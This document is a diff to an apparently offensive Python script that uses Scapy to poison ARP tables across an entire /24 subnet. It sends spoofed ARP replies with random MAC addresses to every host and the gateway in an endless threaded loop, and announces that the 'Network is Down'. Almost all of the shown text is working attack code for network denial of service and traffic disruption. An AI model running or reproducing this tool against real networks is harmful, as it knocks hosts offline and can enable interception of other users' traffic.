@@ -49,14 +49,16 @@ $R@i.~~ !     :   ~$$$$$B$$en:``
 def arp(host, gateway, mac, iface):
     # sends ARP packets to every host on the network poisoning its ARP table.
     # When the ARP table becomes corrupted, the data flow is completely distorted, leading to network failure.
-    gateway_packet = ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
-    sendp(Ether(dst=mac) / gateway_packet, iface=iface, verbose=0)
-    broadcast_packet = ARP(op=2, psrc=gateway, pdst=host, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC())
-    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / broadcast_packet, iface=iface, verbose=0)
+
+    victim_packet = Ether(dst=mac) / ARP(op=2, psrc=gateway, pdst=host, hwdst=mac, hwsrc=RandMAC())
+    sendp(victim_packet, iface=iface, verbose=0)
+    gateway_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
+    sendp(gateway_packet, iface=iface, verbose=0)
 
 def attack(gateway, mac, iface):
-    # Generate all /24 IPv4 hosts
-    # thread host to send ARP packets
+    # Poison ARP tables of all hosts in the subnet
+    # using threads to send spoofed ARP packets to each host
+
     while True:
         ipv4 = ipaddress.IPv4Network(f"{gateway}/24", strict=False)
         lists = [str(ip) for ip in ipv4.hosts() if str(ip) != gateway]
@@ -76,6 +78,7 @@ def arpspoof():
     time.sleep(2)
     print(f"[{g}+{r}] {b}{iface}{r} {b}{subnet}{r}  {g}>{r} {gateway}{g}::{r}{mac} {c}Network is Down !!{r}")
     attack(gateway, mac, iface)
+
 
 
 
